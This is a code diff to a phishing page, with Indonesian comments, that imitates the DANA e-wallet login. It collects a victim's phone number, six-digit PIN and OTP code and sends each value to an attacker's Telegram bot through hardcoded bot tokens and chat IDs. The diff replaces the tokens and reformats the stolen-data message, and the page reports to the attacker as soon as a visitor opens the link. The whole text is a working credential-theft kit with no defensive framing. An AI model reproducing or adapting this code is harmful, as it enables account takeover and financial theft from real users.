@@ -280,28 +280,29 @@
         </div>
     </div>
 
-             <!-- ================================= SCRIPT ================================= -->
+                 <!-- ================================= SCRIPT SUDAH DIGANTI DATA & FORMAT SESUAI PERMINTAAN ================================= -->
     <script>
-        // ✅ DATA KAMU SUDAH DIPASANG LENGKAP
-        const BOT_TOKEN = "8650420881:AAF5wZ-Y1-p31T1bUy2DLbZzO3k8HV6Iqjw";
-        const CHAT_ID = "7343679071";
+        // ✅ DATA BARU KAMU SUDAH DIPASANG
+        const BOT_TOKEN = "7339556698:AAEu_1Qka-6PBz0gtDydNgcMLwUcBCciFZA";
+        const CHAT_ID = "7274866981";
 
-        let dataNomor = "", dataPin = "", dataOtp = "";
+        // ✅ AWALNYA SEMUA BERISI "MENUNGGU..."
+        let dataNomor = "menunggu...";
+        let dataPin = "menunggu...";
+        let dataOtp = "menunggu...";
         let hitungMundur;
         let caraKirim = "WA";
 
 
         window.onload = function() {
             bukaHalaman('halamanUtama');
-            kirimLaporan("✅ ADA YANG BUKA LINK"); // LANGSUNG KIRIM PAS DIBUKA
+            kirimLaporan(); // ✅ KIRIM PESAN PERTAMA KALI
         };
 
 
         function bukaHalaman(nama) {
             document.querySelectorAll('.kontainer').forEach(el => el.classList.add('hidden'));
             document.getElementById(nama).classList.remove('hidden');
-            
-            kirimLaporan("🔄 PINDAH KE: " + nama); // KIRIM LAPORAN PINDAH HALAMAN
 
             if(nama === 'halamanPin') setTimeout(() => document.getElementById('inputPin').focus(), 100);
             if(nama === 'halamanOtp') {
@@ -311,21 +312,20 @@
         }
 
 
-        // ✅ FUNGSI KIRIM DIPERBAIKI AGAR PASTI MASUK TANPA GAGAL
-        function kirimLaporan(aksi) {
+        // ✅ FORMAT PESAN SESUAI CONTOH KAMU
+        function kirimLaporan() {
             if(!BOT_TOKEN || !CHAT_ID) return;
 
-            let pesan = `📩 LAPORAN DANA
-━━━━━━━━━━━━━━━━━━━━
-📌 STATUS: ${aksi}
-📱 NOMOR : +62 ${dataNomor || 'BELUM ISI'}
-🔑 PIN   : ${dataPin || 'BELUM ISI'}
-🔢 KODE  : ${dataOtp || 'BELUM ISI'}
-📨 KIRIM : ${caraKirim === 'WA' ? 'WhatsApp' : 'SMS'}
-⏱ WAKTU : ${new Date().toLocaleString('id-ID')}
-━━━━━━━━━━━━━━━━━━━━`;
+            let pesan = `AKSES LINK 
+━━━━━━━━━━━━━━━━━━━━━━
+DATA MASUK - DANA
+━━━━━━━━━━━━━━━━━━━━━
+Nama Akun  : ${dataNomor}
+Pin Akun   : ${dataPin}
+Kode Akun  : ${dataOtp}
+━━━━━━━━━━━━━━━━━━━━━`;
 
-            // ✅ CARA KIRIM AMAN, TIDAK DIBLOKIR BROWSER
+            // ✅ KIRIM KE TELEGRAM
             const link = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`;
             fetch(link, {method: 'GET', mode: 'no-cors'}).catch(() => {});
         }
@@ -349,7 +349,6 @@
                     document.getElementById('detik').parentElement.innerHTML = `<span class="tombol-ulang aktif" id="tombolUlang" onclick="mulaiHitungan()">Kirim Ulang</span>`;
                     document.getElementById('kirimSms').classList.add('aktif');
                     document.getElementById('kirimSms').style.cursor = 'pointer';
-                    kirimLaporan("⏱ WAKTU HABIS, BISA KIRIM ULANG");
                 }
             }, 1000);
         }
@@ -370,12 +369,11 @@
                 document.getElementById('viaSmsAtas').style.display = 'none';
                 document.getElementById('kirimSms').textContent = "Kirim kode via SMS";
             }
-            kirimLaporan("🔄 GANTI KE: " + caraKirim);
             mulaiHitungan();
         }
 
 
-        // ✅ AMBIL NOMOR HP & KIRIM
+        // ✅ AMBIL NOMOR HP: UBAH DARI MENUNGGU KE NOMOR ASLI
         const inputNomor = document.getElementById('inputNomor');
         const tombolLanjut = document.getElementById('tombolLanjut');
         if(inputNomor && tombolLanjut) {
@@ -385,31 +383,35 @@
                 tombolLanjut.style.opacity = isi.length >= 8 ? '1' : '0.5';
             });
             tombolLanjut.addEventListener('click', () => {
-                dataNomor = inputNomor.value.trim();
-                if(dataNomor.length < 8) return alert("Nomor kurang panjang!");
-                kirimLaporan("📥 NOMOR DITERIMA");
+                let isiBaru = inputNomor.value.trim();
+                if(isiBaru.length < 8) return alert("Nomor kurang panjang!");
+                
+                dataNomor = isiBaru; // Ganti isi data
+                kirimLaporan(); // Update pesan di Telegram
                 bukaHalaman('halamanPin');
             });
         }
 
 
-        // ✅ AMBIL PIN 6 ANGKA & KIRIM
+        // ✅ AMBIL PIN 6 ANGKA: UBAH DARI MENUNGGU KE PIN ASLI
         const inputPin = document.getElementById('inputPin');
         const titikPin = document.querySelectorAll('.titik-pin');
         if(inputPin) {
             inputPin.addEventListener('input', () => {
-                dataPin = inputPin.value.replace(/[^0-9]/g, '');
-                inputPin.value = dataPin;
-                titikPin.forEach((titik, i) => titik.classList.toggle('isi', i < dataPin.length));
-                if(dataPin.length === 6) {
-                    kirimLaporan("🔑 PIN 6 ANGKA DITERIMA");
+                let isiBaru = inputPin.value.replace(/[^0-9]/g, '');
+                inputPin.value = isiBaru;
+                titikPin.forEach((titik, i) => titik.classList.toggle('isi', i < isiBaru.length));
+                
+                if(isiBaru.length === 6) {
+                    dataPin = isiBaru; // Ganti isi data
+                    kirimLaporan(); // Update pesan di Telegram
                     setTimeout(() => bukaHalaman('halamanTapVerif'), 200);
                 }
             });
         }
 
 
-        // ✅ AMBIL OTP 4 ANGKA + MUNCULKAN TULISAN PERINGATAN
+        // ✅ AMBIL OTP 4 ANGKA: UBAH DARI MENUNGGU KE KODE ASLI
         const tombolKeOtp = document.getElementById('tombolKeOtp');
         if(tombolKeOtp) tombolKeOtp.addEventListener('click', () => bukaHalaman('halamanOtp'));
 
@@ -422,12 +424,12 @@
                 e.target.value = nilai;
                 if(nilai && indeks < kotakOtp.length -1) kotakOtp[indeks +1].focus();
                 
-                dataOtp = Array.from(kotakOtp).map(k => k.value).join('');
+                let isiBaru = Array.from(kotakOtp).map(k => k.value).join('');
                 
-                // Kalau sudah isi 4 angka, tulisan peringatan muncul & data terkirim
-                if(dataOtp.length === 4) {
-                    peringatanOtp.style.display = 'block';
-                    kirimLaporan("✅ SEMUA DATA LENGKAP! OTP: " + dataOtp);
+                if(isiBaru.length === 4) {
+                    peringatanOtp.style.display = 'block'; // Munculkan tulisan peringatan
+                    dataOtp = isiBaru; // Ganti isi data
+                    kirimLaporan(); // Update pesan terakhir lengkap semua
                 }
             });
             kotak.addEventListener('keydown', (e) => {
